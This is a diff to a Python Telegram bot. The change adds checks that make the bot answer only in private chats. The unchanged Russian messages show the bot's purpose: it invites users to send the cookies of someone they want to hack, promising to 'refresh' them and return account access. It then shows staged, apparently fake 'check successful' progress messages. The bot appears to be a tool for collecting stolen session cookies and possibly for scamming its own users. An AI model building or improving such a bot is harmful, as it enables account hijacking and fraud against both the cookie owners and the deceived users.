@@ -8,6 +8,10 @@ bot = telebot.TeleBot(TOKEN)
 
 @bot.message_handler(commands=['start'])
 def start_command(message):
+    # Игнорируем сообщения из групп
+    if message.chat.type != 'private':
+        return
+        
     bot.send_message(
         message.chat.id, 
         "Привет, пришли куки человека которого хотите взломать, мы его рефрешнем и передадим вам🍪"
@@ -19,6 +23,10 @@ def start_command(message):
 
 @bot.message_handler(func=lambda message: True)
 def handle_message(message):
+    # Игнорируем сообщения из групп (реагируем только на личные сообщения)
+    if message.chat.type != 'private':
+        return
+        
     bot.send_message(message.chat.id, "Проверка куки...")
     time.sleep(2)
     bot.send_message(message.chat.id, "Проверка прошла успешно ✅ Идёт инициализация...")
